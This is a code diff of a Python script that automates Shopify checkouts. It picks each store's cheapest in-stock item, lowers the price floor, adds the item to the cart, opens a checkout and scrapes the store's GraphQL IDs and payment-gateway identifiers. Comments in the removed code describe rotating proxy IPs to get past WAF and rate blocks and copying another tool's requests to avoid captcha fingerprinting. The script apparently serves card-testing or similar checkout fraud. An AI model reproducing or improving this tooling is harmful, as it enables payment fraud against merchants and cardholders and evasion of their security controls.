@@ -137,13 +137,12 @@ def _is_persisted_stale(text):
 # ═══════════════════════════════════════════════════════════════════════
 # Tunables
 # ═══════════════════════════════════════════════════════════════════════
-MIN_PRICE          = 0.50
-
+MIN_PRICE          = 0.20
 SESSION_TIMEOUT    = 25
 VAULT_TIMEOUT      = 12
 RECEIPT_POLL_MAX   = 5
 RECEIPT_POLL_DELAY = 1.0
-P2_TOTAL_POLL_MAX  = 6
+P2_TOTAL_POLL_MAX  = 3
 P2_TOTAL_POLL_DELAY = 1.0
 
 GQL_RETRY_ATTEMPTS = 1
@@ -942,6 +941,426 @@ async def verify_shopify_store(session, ourl, proxy, profile):
         pass
     return False
 
+async def detect_currency_via_meta(session, domain, proxy, profile):
+    try:
+        r = await session.get(f"{domain}/meta.json",
+                              headers=_probe_headers(profile, domain),
+                              proxy=proxy, timeout=5)
+        if r.status_code == 200:
+            c = r.json().get("currency")
+            if c: return c.upper()
+    except Exception: pass
+    return None
+
+
+async def detect_currency_via_cartjs(session, domain, proxy, profile):
+    try:
+        r = await session.get(f"{domain}/cart.js",
+                              headers=_probe_headers(profile, domain),
+                              proxy=proxy, timeout=5)
+        if r.status_code == 200:
+            c = r.json().get("currency")
+            if c: return c.upper()
+    except Exception: pass
+    return None
+
+
+async def detect_store_currency(session, domain, proxy, profile):
+    tasks = [
+        asyncio.create_task(detect_currency_via_cartjs(session, domain, proxy, profile)),
+        asyncio.create_task(detect_currency_via_meta(session, domain, proxy, profile)),
+    ]
+    try:
+        for coro in asyncio.as_completed(tasks):
+            try:
+                r = await coro
+                if isinstance(r, str) and r:
+                    for t in tasks:
+                        if not t.done(): t.cancel()
+                    return r
+            except Exception: continue
+    except Exception: pass
+    return "USD"
+
+
+async def probe_cart_requires_shipping(session, domain, proxy, profile):
+    try:
+        r = await session.get(f"{domain}/cart.js",
+                              headers=_probe_headers(profile, domain),
+                              proxy=proxy, timeout=5)
+        if r.status_code == 200:
+            j = r.json() or {}
+            items = j.get("items") or []
+            if items:
+                return any(bool(it.get("requires_shipping", True)) for it in items)
+    except Exception:
+        pass
+    return True
+
+
+async def fetch_cheapest_candidate(session, domain, profile, proxy):
+    endpoints = [
+        f"{domain}/products.json",
+        f"{domain}/collections/all/products.json",
+    ]
+    for base_url in endpoints:
+        best, best_price = None, float("inf")
+        for page in range(1, 3):
+            try:
+                r = await session.get(base_url,
+                                      params={"limit": 250, "page": page},
+                                      headers=_probe_headers(profile, domain),
+                                      proxy=proxy, timeout=15)
+            except Exception as e:
+                print(f"[candidates] request error {base_url}: {str(e)[:100]}")
+                break
+            if r.status_code in (400, 403, 404):
+                print(f"[candidates] {base_url} → {r.status_code} (trying next endpoint)")
+                break
+            if r.status_code != 200:
+                print(f"[candidates] {base_url} HTTP {r.status_code}")
+                break
+            try:
+                items = (r.json() or {}).get("products", [])
+            except Exception:
+                break
+            if not items:
+                break
+            for prod in items:
+                handle = prod.get("handle", "")
+                for v in prod.get("variants", []):
+                    if not v.get("available"):
+                        continue
+                    try:
+                        price = float(v.get("price", "0"))
+                    except (ValueError, TypeError):
+                        continue
+                    if price < MIN_PRICE or price >= best_price:
+                        continue
+                    best_price = price
+                    best = {
+                        "variant_id": str(v.get("id", "")),
+                        "price": f"{price:.2f}",
+                        "handle": handle,
+                        "requires_shipping": v.get("requires_shipping", True),
+                    }
+            if best:
+                print(f"[candidates] ✅ cheapest {best['variant_id']} @ {best['price']} (via {base_url})")
+                return best
+    return None
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# Storefront cart
+# ═══════════════════════════════════════════════════════════════════════
+async def storefront_cart_add(session, domain, numeric_variant_id, quantity,
+                              referer, proxy, profile):
+    h = build_headers(profile, domain, for_document=False)
+    h["content-type"] = "application/x-www-form-urlencoded; charset=UTF-8"
+    h["accept"] = "application/json, text/javascript, */*; q=0.01"
+    h["x-requested-with"] = "XMLHttpRequest"
+    h["referer"] = referer or f"{domain}/"
+    try:
+        r = await session.post(f"{domain}/cart/add.js",
+                               data={"id": str(numeric_variant_id), "quantity": str(quantity),
+                                     "form_type": "product", "utf8": "✓"},
+                               headers=h, proxy=proxy, timeout=15)
+    except Exception as e:
+        print(f"[cart] ❌ {str(e)[:150]}")
+        return False, "Change Proxy"
+    if r.status_code == 422:
+        try:
+            err = r.json() or {}
+            msg = (err.get("description") or err.get("message") or "unavailable")[:80]
+        except Exception:
+            msg = "unavailable"
+        return False, f"Cart: {msg}"
+    if r.status_code != 200:
+        return False, f"Cart failed: {r.status_code}"
+    try:
+        j = r.json() or {}
+    except Exception:
+        return False, "Cart failed: bad JSON"
+
+    target_vid = str(numeric_variant_id)
+    if isinstance(j, dict) and isinstance(j.get("items"), list) and j["items"]:
+        item = next((it for it in j["items"] if str(it.get("variant_id")) == target_vid), j["items"][0])
+    elif isinstance(j, dict) and (j.get("variant_id") or j.get("id")):
+        item = j
+    else:
+        return False, "Cart failed: no items"
+
+    raw_price = item.get("final_price") or item.get("price") or 0
+    try:
+        price_str = (f"{float(raw_price):.2f}" if isinstance(raw_price, str) and "." in raw_price
+                     else f"{float(raw_price) / 100:.2f}")
+    except (ValueError, TypeError):
+        price_str = "0.00"
+
+    return True, {"variant_id": str(item.get("variant_id") or numeric_variant_id),
+                  "price": price_str,
+                  "requires_shipping": bool(item.get("requires_shipping", True))}
+
+
+async def view_cart_page(session, domain, referer, proxy, profile):
+    h = build_headers(profile, domain, for_document=True, sec_fetch_site="same-origin", with_user=True)
+    h["referer"] = referer or f"{domain}/"
+    try:
+        r = await session.get(f"{domain}/cart", headers=h, proxy=proxy,
+                              timeout=15, allow_redirects=True)
+        if r.status_code == 200: return r.text
+    except Exception: pass
+    return ""
+
+
+async def resolve_checkout_after_cart(session, domain, cart_html, proxy, profile):
+    post_h = _checkout_headers(profile, domain, domain)
+    post_h["referer"] = f"{domain}/cart"
+    post_h["content-type"] = "application/x-www-form-urlencoded"
+
+    data = {"checkout": ""}
+    tok = extract_between(cart_html or "", 'name="authenticity_token" value="', '"')
+    if tok: data["authenticity_token"] = tok
+    try:
+        r = await session.post(f"{domain}/cart", data=data, headers=post_h,
+                               proxy=proxy, timeout=15, allow_redirects=False)
+        loc = r.headers.get("Location") or r.headers.get("location")
+        if loc:
+            full = loc if loc.startswith("http") else f"{domain}{loc}"
+            try:
+                redir_h = build_headers(profile, domain, for_document=True,
+                                        sec_fetch_site="same-origin", with_user=False)
+                redir_h["referer"] = f"{domain}/cart"
+                r2 = await session.get(full, headers=redir_h, proxy=proxy,
+                                       timeout=20, allow_redirects=True)
+                if "/checkouts/" in str(r2.url):
+                    return str(r2.url), r2.text, r2
+            except Exception: pass
+    except Exception: pass
+
+    try:
+        direct_h = build_headers(profile, domain, for_document=True, sec_fetch_site="same-origin", with_user=True)
+        direct_h["referer"] = f"{domain}/cart"
+        r = await session.get(f"{domain}/checkout", headers=direct_h,
+                              proxy=proxy, timeout=20, allow_redirects=True)
+        if "/checkouts/" in str(r.url):
+            return str(r.url), r.text, r
+    except Exception: pass
+    return None, None, None
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# Persisted ID discovery
+# ═══════════════════════════════════════════════════════════════════════
+async def discover_persisted_ids(session, checkout_html, checkout_origin,
+                                 headers, proxy, profile):
+    OPS = ("Proposal", "SubmitForCompletion", "PollForReceipt")
+    ids = {}
+    for manifest_url in (f"https://{checkout_origin}/checkouts/internal/graphql/manifest",
+                         f"https://{checkout_origin}/checkout-web/assets/manifest.json"):
+        try:
+            r = await session.get(manifest_url, headers=headers, proxy=proxy, timeout=8)
+            if r.status_code == 200:
+                for op in OPS:
+                    m = re.search(rf'"{op}"\s*:\s*"([a-f0-9]{{64}})"', r.text)
+                    if m: ids[op] = m.group(1)
+                if len(ids) == len(OPS): return ids
+        except Exception: pass
+
+    js_urls = []
+    js_urls += re.findall(r'src="(https?://[^"]+\.(?:js|mjs)[^"]*)"', checkout_html)
+    for rel in re.findall(r'src="(/[^"]+\.(?:js|mjs)[^"]*)"', checkout_html):
+        js_urls.append(f"https://{checkout_origin}{rel}")
+    js_urls += re.findall(r'href="(https?://[^"]+\.(?:js|mjs)[^"]*)"', checkout_html)
+    js_urls = list(dict.fromkeys(js_urls))[:30]
+    if not js_urls: return ids
+
+    def _patterns(op):
+        return [
+            rf'"{op}"\s*:\s*"([a-f0-9]{{64}})"',
+            rf"'{op}'\s*:\s*'([a-f0-9]{{64}})'",
+            rf'\.{op}\s*=\s*"([a-f0-9]{{64}})"',
+            rf"\b{op}\s*=\s*([a-f0-9]{{64}})",
+            rf'"{op}"\s*,\s*"([a-f0-9]{{64}})"',
+            rf'\[\s*"{op}"\s*,\s*"([a-f0-9]{{64}})"',
+        ]
+
+    script_h = _script_headers(profile, checkout_origin)
+    for url in js_urls:
+        try:
+            r = await session.get(url, proxy=proxy, timeout=12, headers=script_h)
+            if r.status_code != 200: continue
+            cl = r.headers.get("content-length")
+            if cl and int(cl) > 3_000_000: continue
+            text = r.text
+            for op in OPS:
+                if op in ids: continue
+                for pat in _patterns(op):
+                    m = re.search(pat, text)
+                    if m: ids[op] = m.group(1); break
+            if len(ids) == len(OPS): break
+        except Exception: continue
+    return ids
+
+
+async def get_ids_for_build(build_id, session, checkout_html, checkout_origin,
+                            headers, proxy, profile):
+    if build_id and build_id in _ID_CACHE:
+        return _ID_CACHE.get(build_id)
+    ids = await discover_persisted_ids(session, checkout_html, checkout_origin,
+                                       headers, proxy, profile)
+    if ids and build_id:
+        _ID_CACHE[build_id] = ids
+    return ids
+
+
+async def _raw_http_call(session, url, params, headers, json_data, proxy, retries=0):
+    last_resp, last_text = None, ""
+    for attempt in range(retries + 1):
+        try:
+            r = await session.post(url, params=params, headers=headers,
+                                   json=json_data, proxy=proxy)
+            text = r.text
+            stripped = text.strip()
+            is_5xx  = r.status_code in (502, 503, 504)
+            is_html = stripped.startswith("<!DOCTYPE") or stripped.startswith("<html")
+
+            if attempt < retries and is_5xx:
+                wait = _throttle_wait(r, 0.5)
+                print(f"[retry] {r.status_code} — retrying in {wait:.2f}s ({attempt+1}/{retries})")
+                await asyncio.sleep(wait)
+                last_resp, last_text = r, text
+                continue
+
+            if is_html:
+                print(f"[raw] ⚠️ HTML status={r.status_code} head={stripped[:120]!r}")
+                return r, "Change Proxy"
+
+            return r, text
+        except Exception as e:
+            err = str(e)
+            print(f"[raw] ⚠️ network exception: {err[:150]}")
+            return None, "Change Proxy"
+    return last_resp, last_text
+
+
+def _strip_none_vars(variables):
+    if not isinstance(variables, dict): return variables
+    return {k: v for k, v in variables.items() if v is not None}
+
+
+async def gql(session, op_name, headers, payload, proxy,
+              checkout_html=None, checkout_origin=None, build_id=None,
+              profile=None):
+    retries = GQL_RETRY_ATTEMPTS if op_name in ("Proposal", "PollForReceipt") else 0
+    current_id = _current_id_for(op_name)
+    last_resp, last_text = None, ""
+    clean_vars = _strip_none_vars(payload.get("variables", {}))
+
+    if current_id and checkout_origin:
+        url = f"https://{checkout_origin}/checkouts/internal/graphql/persisted"
+        last_resp, last_text = await _raw_http_call(
+            session, url, {"operationName": op_name}, headers,
+            {**payload, "variables": clean_vars, "id": current_id},
+            proxy, retries=retries)
+        if not _is_persisted_stale(last_text):
+            return last_resp, last_text
+        print(f"[persisted] {op_name} — ID stale ({current_id[:12]}…)")
+
+    if checkout_html and checkout_origin and profile:
+        fresh_ids = await get_ids_for_build(
+            build_id, session, checkout_html, checkout_origin,
+            headers, proxy, profile)
+        if fresh_ids.get(op_name):
+            new_id = fresh_ids[op_name]
+            if new_id != current_id:
+                _set_persisted_id(op_name, new_id)
+                url = f"https://{checkout_origin}/checkouts/internal/graphql/persisted"
+                last_resp, last_text = await _raw_http_call(
+                    session, url, {"operationName": op_name}, headers,
+                    {**payload, "variables": clean_vars, "id": new_id},
+                    proxy, retries=retries)
+                if not _is_persisted_stale(last_text):
+                    print(f"[persisted] {op_name} — recovered ({new_id[:12]}…)")
+                    return last_resp, last_text
+
+    if _RAW_QUERIES_AVAILABLE and checkout_origin and op_name in _RAW_QUERIES:
+        raw_q = _RAW_QUERIES[op_name]
+        if raw_q:
+            url = f"https://{checkout_origin}/checkouts/unstable/graphql"
+            print(f"[raw-tier3] {op_name} — falling back to raw query")
+            last_resp, last_text = await _raw_http_call(
+                session, url, {"operationName": op_name}, headers,
+                {"query": raw_q, "variables": clean_vars, "operationName": op_name},
+                proxy, retries=retries)
+            if last_text and last_text != "Change Proxy":
+                return last_resp, last_text
+
+    if not last_text:
+        return last_resp, "Change Proxy"
+    return last_resp, last_text
+
+
+def _extract_amounts_from_seller(sp):
+    """Extract only: totals (for reporting) + payment identifiers.
+    Tax / merch / shipping are intentionally NOT extracted — the submit
+    payload uses {any: True} for those so Shopify computes them from
+    the payment amount, eliminating TAX_TAX_INCLUSIVITY_MISMATCH on
+    VAT-inclusive (UK/EU) stores."""
+    out = {
+        "checkout_total": None, "total": None, "running": None,
+        "payment_identifier": None, "payment_stable_id": None,
+        "payment_due_at": None, "payment_special": None,
+        "gateway": None,
+    }
+    try:
+        v = (sp.get("checkoutTotal") or {}).get("value", {}).get("amount")
+        if v is not None: out["checkout_total"] = str(v)
+        v = (sp.get("total") or {}).get("value", {}).get("amount")
+        if v is not None: out["total"] = str(v)
+        v = (sp.get("runningTotal") or {}).get("value", {}).get("amount")
+        if v is not None: out["running"] = str(v)
+    except Exception: pass
+    try:
+        pay = sp.get("payment") or {}
+        if pay.get("__typename") == "FilledPaymentTerms":
+            best = None
+            for m in pay.get("availablePaymentLines", []):
+                pm = m.get("paymentMethod", {})
+                ident = pm.get("paymentMethodIdentifier")
+                if not ident: continue
+                if pm.get("checkoutHostedFields"):
+                    best = pm; break
+                if best is None: best = pm
+            if best:
+                out["payment_identifier"] = best["paymentMethodIdentifier"]
+                out["gateway"] = (best.get("extensibilityDisplayName") or best.get("name"))
+        pl = pay.get("paymentLines") or []
+        if pl and isinstance(pl[0], dict):
+            out["payment_stable_id"] = pl[0].get("stableId")
+            out["payment_due_at"] = pl[0].get("dueAt")
+            out["payment_special"] = pl[0].get("specialInstructions")
+    except Exception: pass
+    return out
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# Main flow
+# ═══════════════════════════════════════════════════════════════════════
+def _poll_after_seconds(val, default=2.0):
+    try:
+        if isinstance(val, (int, float)):
+            return max(float(val), 1.5)
+        sv = str(val).strip()
+        if "T" in sv and ":" in sv:
+            from datetime import datetime, timezone
+            dt = datetime.fromisoformat(sv.replace("Z", "+00:00"))
+            return max((dt - datetime.now(timezone.utc)).total_seconds(), 1.5)
+        return max(float(sv), 1.5)
+    except Exception:
+        return default
+
+
 async def fetch_products(domain, proxy_str=None, price_floor=None):
     try:
         if not domain.startswith('http'):
@@ -1068,531 +1487,6 @@ async def fetch_products(domain, proxy_str=None, price_floor=None):
         return False, f"error: {str(e)}"
 
 
-
-async def detect_currency_via_meta(session, domain, proxy, profile):
-    try:
-        r = await session.get(f"{domain}/meta.json",
-                              headers=_probe_headers(profile, domain),
-                              proxy=proxy, timeout=5)
-        if r.status_code == 200:
-            c = r.json().get("currency")
-            if c: return c.upper()
-    except Exception: pass
-    return None
-
-
-async def detect_currency_via_cartjs(session, domain, proxy, profile):
-    try:
-        r = await session.get(f"{domain}/cart.js",
-                              headers=_probe_headers(profile, domain),
-                              proxy=proxy, timeout=5)
-        if r.status_code == 200:
-            c = r.json().get("currency")
-            if c: return c.upper()
-    except Exception: pass
-    return None
-
-
-async def detect_store_currency(session, domain, proxy, profile):
-    # deterministic: meta.json (shop's real currency) first; cart.js (geo-adjusted) only as fallback
-    r = await detect_currency_via_meta(session, domain, proxy, profile)
-    if isinstance(r, str) and r:
-        return r
-    r = await detect_currency_via_cartjs(session, domain, proxy, profile)
-    if isinstance(r, str) and r:
-        return r
-    return "USD"
-
-
-async def probe_cart_requires_shipping(session, domain, proxy, profile):
-    try:
-        r = await session.get(f"{domain}/cart.js",
-                              headers=_probe_headers(profile, domain),
-                              proxy=proxy, timeout=5)
-        if r.status_code == 200:
-            j = r.json() or {}
-            items = j.get("items") or []
-            if items:
-                return any(bool(it.get("requires_shipping", True)) for it in items)
-    except Exception:
-        pass
-    return True
-
-
-async def fetch_cheapest_candidate(session, domain, profile, proxy):
-    try:
-        if not domain.startswith('http'):
-            domain = "https://" + domain
-
-        proxy = parse_proxy(proxy) if proxy else None
-        proxies = {"http": proxy, "https": proxy} if proxy else None
-
-        async with AsyncSession(impersonate="chrome", verify=False, timeout=15) as fetch_session:
-            result = None
-            saw_response = False
-            waf_blocked = False
-            for base_url in [f"{domain}/products.json", f"{domain}/collections/all/products.json"]:
-                for _try in range(5):
-                    try:
-                        r = await fetch_session.get(base_url, params={"limit": 250}, proxies=proxies, timeout=10)
-                        saw_response = True
-                        if r.status_code in (429, 401, 403, 503):
-                            # WAF/rate challenge — rotating proxies exit a NEW IP per
-                            # request, so RETRY (like rukia does) instead of giving up
-                            print(f"[candidates] {base_url} HTTP {r.status_code} (try {_try+1}/5)")
-                            waf_blocked = True
-                            await asyncio.sleep(0.8 + 0.7 * _try)
-                            continue
-                        if r.status_code != 200:
-                            print(f"[candidates] {base_url} HTTP {r.status_code}")
-                            waf_blocked = True
-                            break
-                        text = r.text
-                        if "shopify" not in text.lower():
-                            break
-                        result = r.json().get("products") or []
-                        break
-                    except Exception as e:
-                        print(f"[candidates] request error {base_url}: {str(e)[:100]}")
-                        await asyncio.sleep(0.5)
-                if result:
-                    break
-            if not result:
-                # transport failure OR WAF block → the proxy is the problem, not
-                # the catalog; report so the caller rotates the proxy
-                if not saw_response or waf_blocked:
-                    return "PROXY_DEAD"
-                return None
-
-            best, best_price = None, float("inf")
-            best_avail, best_avail_price = None, float("inf")
-            for prod in result:
-                handle = prod.get("handle", "")
-                for v in prod.get("variants", []):
-                    try:
-                        price = float(v.get("price", "0"))
-                    except (ValueError, TypeError):
-                        continue
-                    if price < MIN_PRICE:
-                        continue
-                    if price < best_price:
-                        best_price = price
-                        best = {
-                            "variant_id": str(v.get("id", "")),
-                            "price": f"{price:.2f}",
-                            "handle": handle,
-                            "requires_shipping": v.get("requires_shipping", True),
-                        }
-                    if v.get("available") and price < best_avail_price:
-                        best_avail_price = price
-                        best_avail = {
-                            "variant_id": str(v.get("id", "")),
-                            "price": f"{price:.2f}",
-                            "handle": handle,
-                            "requires_shipping": v.get("requires_shipping", True),
-                        }
-            if best_avail:
-                print(f"[candidates] ✅ cheapest AVAILABLE {best_avail['variant_id']} @ {best_avail['price']}")
-                return best_avail
-            if best:
-                print(f"[candidates] ✅ cheapest (none in stock) {best['variant_id']} @ {best['price']}")
-                return best
-            return None
-
-    except Exception as e:
-        print(f"[candidates] EXCEPTION: {type(e).__name__}: {str(e)[:100]}")
-        return None
-
-
-
-    except Exception as e:
-        return None  # error — the caller handles None as 'no candidate'
-
-
-        if best:
-            print(f"[candidates] ✅ cheapest via {'proxy' if use_proxy else 'direct'}")
-            return best
-    return None
-
-
-# ═══════════════════════════════════════════════════════════════════════
-# Storefront cart
-# ═══════════════════════════════════════════════════════════════════════
-async def storefront_cart_add(session, domain, numeric_variant_id, quantity,
-                              referer, proxy, profile):
-    h = build_headers(profile, domain, for_document=False)
-    h["content-type"] = "application/x-www-form-urlencoded; charset=UTF-8"
-    h["accept"] = "application/json, text/javascript, */*; q=0.01"
-    h["x-requested-with"] = "XMLHttpRequest"
-    h["referer"] = referer or f"{domain}/"
-    r = None
-    for _try in range(4):
-        try:
-            r = await session.post(f"{domain}/cart/add.js",
-                                   data={"id": str(numeric_variant_id), "quantity": str(quantity),
-                                         "form_type": "product", "utf8": "✓"},
-                                   headers=h, proxy=proxy, timeout=15)
-        except Exception as e:
-            print(f"[cart] ⚠️ {_try+1}/4 {str(e)[:100]}")
-            await asyncio.sleep(0.8)
-            continue
-        if r.status_code in (403, 429, 503) and _try < 3:
-            # rotating egress: retry exits a new IP
-            print(f"[cart] ⚠️ HTTP {r.status_code} (try {_try+1}/4)")
-            await asyncio.sleep(1.0 + 0.8 * _try)
-            continue
-        break
-    if r is None:
-        print(f"[cart] ❌ all attempts failed")
-        return False, "Change Proxy"
-    if r.status_code == 422:
-        try:
-            err = r.json() or {}
-            msg = (err.get("description") or err.get("message") or "unavailable")[:80]
-        except Exception:
-            msg = "unavailable"
-        return False, f"Cart: {msg}"
-    if r.status_code != 200:
-        return False, f"Cart failed: {r.status_code}"
-    try:
-        j = r.json() or {}
-    except Exception:
-        return False, "Cart failed: bad JSON"
-
-    target_vid = str(numeric_variant_id)
-    if isinstance(j, dict) and isinstance(j.get("items"), list) and j["items"]:
-        item = next((it for it in j["items"] if str(it.get("variant_id")) == target_vid), j["items"][0])
-    elif isinstance(j, dict) and (j.get("variant_id") or j.get("id")):
-        item = j
-    else:
-        return False, "Cart failed: no items"
-
-    raw_price = item.get("final_price") or item.get("price") or 0
-    try:
-        price_str = (f"{float(raw_price):.2f}" if isinstance(raw_price, str) and "." in raw_price
-                     else f"{float(raw_price) / 100:.2f}")
-    except (ValueError, TypeError):
-        price_str = "0.00"
-
-    return True, {"variant_id": str(item.get("variant_id") or numeric_variant_id),
-                  "price": price_str,
-                  "requires_shipping": bool(item.get("requires_shipping", True))}
-
-
-async def view_cart_page(session, domain, referer, proxy, profile):
-    h = build_headers(profile, domain, for_document=True, sec_fetch_site="same-origin", with_user=True)
-    h["referer"] = referer or f"{domain}/"
-    try:
-        r = await session.get(f"{domain}/cart", headers=h, proxy=proxy,
-                              timeout=15, allow_redirects=True)
-        if r.status_code == 200: return r.text
-    except Exception: pass
-    return ""
-
-
-async def resolve_checkout_after_cart(session, domain, cart_html, proxy, profile, currency="USD"):
-    post_h = _checkout_headers(profile, domain, domain)
-    post_h["referer"] = f"{domain}/cart"
-    post_h["content-type"] = "application/x-www-form-urlencoded"
-
-    data = {"checkout": ""}
-    tok = extract_between(cart_html or "", 'name="authenticity_token" value="', '"')
-    if tok: data["authenticity_token"] = tok
-    # rotating egress: retry the whole creation up to 3× — each try exits a new IP
-    for _round in range(3):
-        try:
-            r = await session.post(f"{domain}/cart", data=data, headers=post_h,
-                                   proxy=proxy, timeout=15, allow_redirects=False)
-            loc = r.headers.get("Location") or r.headers.get("location")
-            if loc and "customer_authentication" in loc:
-                return None, "LOGIN_REQUIRED", None
-            if loc:
-                full = loc if loc.startswith("http") else f"{domain}{loc}"
-                try:
-                    redir_h = build_headers(profile, domain, for_document=True,
-                                            sec_fetch_site="same-origin", with_user=False)
-                    redir_h["referer"] = f"{domain}/cart"
-                    r2 = await session.get(full, headers=redir_h, proxy=proxy,
-                                           timeout=20, allow_redirects=True)
-                    if "/checkouts/" in str(r2.url):
-                        return str(r2.url), r2.text, r2
-                    if "customer_authentication" in str(r2.url) or "authentication" in str(r2.url):
-                        return None, "LOGIN_REQUIRED", None
-                except Exception: pass
-            else:
-                # WAF/no-location — retry round exits a fresh IP
-                await asyncio.sleep(0.8 + 0.6 * _round)
-                continue
-        except Exception:
-            await asyncio.sleep(0.6)
-            continue
-        break
-
-    for _try in range(2):
-        try:
-            direct_h = build_headers(profile, domain, for_document=True, sec_fetch_site="same-origin", with_user=True)
-            direct_h["referer"] = f"{domain}/cart"
-            r = await session.get(f"{domain}/checkout?currency={currency}", headers=direct_h,
-                                  proxy=proxy, timeout=20, allow_redirects=True)
-            if "/checkouts/" in str(r.url):
-                return str(r.url), r.text, r
-        except Exception:
-            await asyncio.sleep(0.6)
-            continue
-        break
-    return None, None, None
-
-
-# ═══════════════════════════════════════════════════════════════════════
-# Persisted ID discovery
-# ═══════════════════════════════════════════════════════════════════════
-async def discover_persisted_ids(session, checkout_html, checkout_origin,
-                                 headers, proxy, profile):
-    OPS = ("Proposal", "SubmitForCompletion", "PollForReceipt")
-    ids = {}
-    for manifest_url in (f"https://{checkout_origin}/checkouts/internal/graphql/manifest",
-                         f"https://{checkout_origin}/checkout-web/assets/manifest.json"):
-        try:
-            r = await session.get(manifest_url, headers=headers, proxy=proxy, timeout=8)
-            if r.status_code == 200:
-                for op in OPS:
-                    m = re.search(rf'"{op}"\s*:\s*"([a-f0-9]{{64}})"', r.text)
-                    if m: ids[op] = m.group(1)
-                if len(ids) == len(OPS): return ids
-        except Exception: pass
-
-    js_urls = []
-    js_urls += re.findall(r'src="(https?://[^"]+\.(?:js|mjs)[^"]*)"', checkout_html)
-    for rel in re.findall(r'src="(/[^"]+\.(?:js|mjs)[^"]*)"', checkout_html):
-        js_urls.append(f"https://{checkout_origin}{rel}")
-    js_urls += re.findall(r'href="(https?://[^"]+\.(?:js|mjs)[^"]*)"', checkout_html)
-    js_urls = list(dict.fromkeys(js_urls))[:30]
-    if not js_urls: return ids
-
-    def _patterns(op):
-        return [
-            rf'"{op}"\s*:\s*"([a-f0-9]{{64}})"',
-            rf"'{op}'\s*:\s*'([a-f0-9]{{64}})'",
-            rf'\.{op}\s*=\s*"([a-f0-9]{{64}})"',
-            rf"\b{op}\s*=\s*([a-f0-9]{{64}})",
-            rf'"{op}"\s*,\s*"([a-f0-9]{{64}})"',
-            rf'\[\s*"{op}"\s*,\s*"([a-f0-9]{{64}})"',
-        ]
-
-    script_h = _script_headers(profile, checkout_origin)
-    for url in js_urls:
-        try:
-            r = await session.get(url, proxy=proxy, timeout=12, headers=script_h)
-            if r.status_code != 200: continue
-            cl = r.headers.get("content-length")
-            if cl and int(cl) > 3_000_000: continue
-            text = r.text
-            for op in OPS:
-                if op in ids: continue
-                for pat in _patterns(op):
-                    m = re.search(pat, text)
-                    if m: ids[op] = m.group(1); break
-            if len(ids) == len(OPS): break
-        except Exception: continue
-    return ids
-
-
-async def get_ids_for_build(build_id, session, checkout_html, checkout_origin,
-                            headers, proxy, profile):
-    if build_id and build_id in _ID_CACHE:
-        return _ID_CACHE.get(build_id)
-    ids = await discover_persisted_ids(session, checkout_html, checkout_origin,
-                                       headers, proxy, profile)
-    if ids and build_id:
-        _ID_CACHE[build_id] = ids
-    return ids
-
-
-async def _raw_http_call(session, url, params, headers, json_data, proxy, retries=0):
-    last_resp, last_text = None, ""
-    for attempt in range(retries + 1):
-        try:
-            r = await session.post(url, params=params, headers=headers,
-                                   json=json_data, proxy=proxy)
-            text = r.text
-            stripped = text.strip()
-            is_5xx  = r.status_code in (502, 503, 504)
-            is_html = stripped.startswith("<!DOCTYPE") or stripped.startswith("<html")
-
-            if attempt < retries and is_5xx:
-                wait = _throttle_wait(r, 0.5)
-                print(f"[retry] {r.status_code} — retrying in {wait:.2f}s ({attempt+1}/{retries})")
-                await asyncio.sleep(wait)
-                last_resp, last_text = r, text
-                continue
-
-            if is_html:
-                print(f"[raw] ⚠️ HTML status={r.status_code} head={stripped[:120]!r}")
-                return r, "Change Proxy"
-
-            return r, text
-        except Exception as e:
-            err = str(e)
-            print(f"[raw] ⚠️ network exception: {err[:150]}")
-            return None, "Change Proxy"
-    return last_resp, last_text
-
-
-def _strip_none_vars(variables):
-    if not isinstance(variables, dict): return variables
-    return {k: v for k, v in variables.items() if v is not None}
-
-
-async def gql(session, op_name, headers, payload, proxy,
-              checkout_html=None, checkout_origin=None, build_id=None,
-              profile=None):
-    retries = GQL_RETRY_ATTEMPTS if op_name in ("Proposal", "PollForReceipt") else 0
-    current_id = _current_id_for(op_name)
-    last_resp, last_text = None, ""
-    clean_vars = _strip_none_vars(payload.get("variables", {}))
-
-    # 🔥 WIRE ALIGNMENT (core captcha fix): the RAW unstable/graphql route with
-    # the FULL query text is now PRIMARY — identical to the reference engine
-    # (s4chiz/rukia). The persisted-ID route is a fingerprintable divergence and
-    # is now only a fallback when a raw query is unavailable.
-    if _RAW_QUERIES_AVAILABLE and checkout_origin and op_name in _RAW_QUERIES:
-        raw_q = _RAW_QUERIES[op_name]
-        if raw_q:
-            url = f"https://{checkout_origin}/checkouts/unstable/graphql"
-            last_resp, last_text = await _raw_http_call(
-                session, url, {"operationName": op_name}, headers,
-                {"query": raw_q, "variables": clean_vars, "operationName": op_name},
-                proxy, retries=retries)
-            if last_text and last_text != "Change Proxy" and not _is_persisted_stale(last_text):
-                return last_resp, last_text
-            print(f"[raw] {op_name} — raw route rejected, trying persisted fallback")
-
-    if current_id and checkout_origin:
-        url = f"https://{checkout_origin}/checkouts/internal/graphql/persisted"
-        last_resp, last_text = await _raw_http_call(
-            session, url, {"operationName": op_name}, headers,
-            {**payload, "variables": clean_vars, "id": current_id},
-            proxy, retries=retries)
-        if not _is_persisted_stale(last_text):
-            return last_resp, last_text
-        print(f"[persisted] {op_name} — ID stale ({current_id[:12]}…)")
-
-    if checkout_html and checkout_origin and profile:
-        fresh_ids = await get_ids_for_build(
-            build_id, session, checkout_html, checkout_origin,
-            headers, proxy, profile)
-        if fresh_ids.get(op_name):
-            new_id = fresh_ids[op_name]
-            if new_id != current_id:
-                _set_persisted_id(op_name, new_id)
-                url = f"https://{checkout_origin}/checkouts/internal/graphql/persisted"
-                last_resp, last_text = await _raw_http_call(
-                    session, url, {"operationName": op_name}, headers,
-                    {**payload, "variables": clean_vars, "id": new_id},
-                    proxy, retries=retries)
-                if not _is_persisted_stale(last_text):
-                    print(f"[persisted] {op_name} — recovered ({new_id[:12]}…)")
-                    return last_resp, last_text
-
-    if _RAW_QUERIES_AVAILABLE and checkout_origin and op_name in _RAW_QUERIES:
-        raw_q = _RAW_QUERIES[op_name]
-        if raw_q:
-            url = f"https://{checkout_origin}/checkouts/unstable/graphql"
-            print(f"[raw-tier3] {op_name} — falling back to raw query")
-            last_resp, last_text = await _raw_http_call(
-                session, url, {"operationName": op_name}, headers,
-                {"query": raw_q, "variables": clean_vars, "operationName": op_name},
-                proxy, retries=retries)
-            if last_text and last_text != "Change Proxy":
-                return last_resp, last_text
-
-    if not last_text:
-        return last_resp, "Change Proxy"
-    return last_resp, last_text
-
-
